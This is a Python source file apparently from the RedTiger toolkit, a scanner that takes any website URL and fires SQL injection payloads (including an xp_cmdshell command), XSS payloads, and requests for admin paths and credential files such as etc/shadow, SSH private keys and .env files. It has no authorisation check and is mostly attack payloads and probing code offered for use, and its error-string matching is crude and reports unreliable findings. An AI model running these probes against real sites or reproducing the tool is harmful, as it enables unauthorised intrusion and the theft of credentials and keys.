# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *

try:
    import requests
    from bs4 import BeautifulSoup
    from datetime import datetime
except Exception as e:
    ErrorModule(e)

Title("Sql Vulnerability Scanner")

try:
    def Interesting_Path(url):
        interesting_paths = [
            "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
            "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
            "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
            "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
            "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
            "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
            "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
            "server-status", "server-status", "server-status/", "server-status/index.html",
            "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
        ]

        try:
            found = 0
            if not url.endswith("/"):
                url += "/"
            
            for path in interesting_paths:
                test_url = url + path
                response = requests.get(test_url, timeout=10)
                if response.status_code == 200:
                    found += 1
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Vulnerability: {white}Interesting Path{green} Status: {white}True{green} Path Found: {white}/{path}{green}")
        except:
            pass
        if found == 0:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white}Interesting Path{red} Status: {white}False{red}")

    def Sensitive_File(url):
        sensitive_files = [
            "etc/passwd", "etc/password", "etc/ip", "etc/passwords", "etc/ips", "etc/shadow", "etc/group",
            "etc/hosts", "etc/hostname", "etc/network/interfaces",
            "etc/sysconfig/network", "etc/sysconfig/network-scripts/ifcfg-*", "etc/fstab",
            "etc/resolv.conf", "etc/issue", "etc/motd",
            "etc/apt/sources.list", "etc/yum.conf", "etc/sudoers",
            "passwd", "password", "ip", "passwords", "ips", "shadow", "group",
            "hosts", "hostname", "network/interfaces",
            "sysconfig/network", "sysconfig/network-scripts/ifcfg-*", "fstab",
            "resolv.conf", "issue", "motd",
            "apt/sources.list", "yum.conf", "sudoers",
            "var/log/auth.log", "var/log/syslog", "var/log/messages",
            "var/log/dmesg", "var/log/secure", "var/log/maillog",
            "var/log/httpd/access_log", "var/log/httpd/error_log", "var/log/apache2/access.log",
            "var/log/apache2/error.log", "var/log/nginx/access.log", "var/log/nginx/error.log",
            "root/.bash_history", "root/.ssh/authorized_keys", "root/.ssh/id_rsa",
            "root/.ssh/id_rsa.pub", "root/.ssh/known_hosts", "home/user/.bash_history",
            "home/user/.ssh/authorized_keys", "home/user/.ssh/id_rsa", "home/user/.ssh/id_rsa.pub",
            "home/user/.ssh/known_hosts", "www/html/config.php", "www/html/wp-config.php",
            "www/html/.htaccess", "www/html/.env", "opt/lampp/etc/my.cnf",
            "opt/lampp/htdocs/index.php", "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/grub.cfg",
            "boot/grub/menu.lst", "proc/self/environ", "proc/version",
            "proc/cmdline", "proc/mounts", "proc/net/arp",
            "proc/net/tcp", "proc/net/udp", "proc/net/fib_trie"
        ]

        try:
            found = 0
            if not url.endswith("/"):
                url += "/"

            for file in sensitive_files:
                test_url = url + file
                response = requests.get(test_url, timeout=10)
                if response.status_code == 200:
                    if any(file in response.text for file in sensitive_files):
                        found += 1
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Vulnerability: {white}Sensitive File{green} Status: {white}True{green} File Found: {white}/{file}{green}")
        except:
            pass
        if found == 0:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white}Sensitive File{red} Status: {white}False{red}")

    def Xss(url):
        xss_provocations = [
            "<script>alert('XssFoundByRedTiger')</script>", "<img src=x onerror=alert('XssFoundByRedTiger')>", "<body onload=alert('XssFoundByRedTiger')>", 
            "<svg/onload=alert('XssFoundByRedTiger')>", "javascript:alert('XssFoundByRedTiger')", "<iframe src='javascript:alert(\"XssFoundByRedTiger\")'></iframe>", 
            "<input type=\"text\" onfocus=\"alert('XssFoundByRedTiger')\">", "<link rel=\"stylesheet\" href=\"javascript:alert('XssFoundByRedTiger');\">",
            "<a href=\"javascript:alert('XssFoundByRedTiger')\">Click me</a>", "<form action=\"javascript:alert('XssFoundByRedTiger')\"><input type=submit>",
            "'\"><script>alert('XssFoundByRedTiger')</script>", "'><img src=x onerror=alert('XssFoundByRedTiger')>", "<object data='javascript:alert(\"XssFoundByRedTiger\")'></object>",
            "<embed src='data:text/html,<script>alert(\"XssFoundByRedTiger\")</script>'>"
        ]

        xss_indicators = [
            "<script>", "alert(", "onerror=", "onload=", "<svg", "javascript:", "<iframe", "<input", "<link", "<form", 
            "<object", "<embed", "XssFoundByRedTiger"
        ]

        try:
            found = 0 
            for xss_provocation in xss_provocations:
                test_url = url + xss_provocation
                response = requests.get(test_url, timeout=10)
                if response.status_code == 200:
                    for xss_indicator in xss_indicators:
                        if xss_indicator in response.text:
                            found += 1
                            print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Vulnerability: {white}Xss{green} Status: {white}True{green} Error: {white + xss_indicator + green} Provocation: {white}{xss_provocation}{green}")
                            break
        except:
            pass
        if found == 0:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white}Xss{red} Status: {white}False{red}")


    def Sql(url):
        sql_indicators = [
            "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near", 
            "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
        ]

        sql_provocations  = [
            "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
            "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
            "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
            "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
            "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
            "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
            "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
        ]

        try:
            found = 0
            for sql_provocation in sql_provocations:
                test_url = url + sql_provocation
                response = requests.get(test_url, timeout=10)
                if response.status_code == 200:
                    for sql_indicator in sql_indicators:
                        if sql_indicator in response.text:
                            found += 1
                            print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Vulnerability: {white}Sql{green} Status: {white}True{green} Error: {white + sql_indicator + green} Provocation: {white}{sql_provocation}{green}")
                            break
        except:
            pass
        if found == 0:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white}Sql{red} Status: {white}False{red}")

    Slow(sql_banner)
    website_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Website Url -> {reset}")
    Censored(website_url)

    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Looking for a vulnerability..")
    if "https://" not in website_url and "http://" not in website_url:
        website_url = "https://" + website_url

    Sql(website_url)
    Xss(website_url)
    Interesting_Path(website_url)
    Sensitive_File(website_url)
    Continue()
    Reset()

except Exception as e:
    Error(e)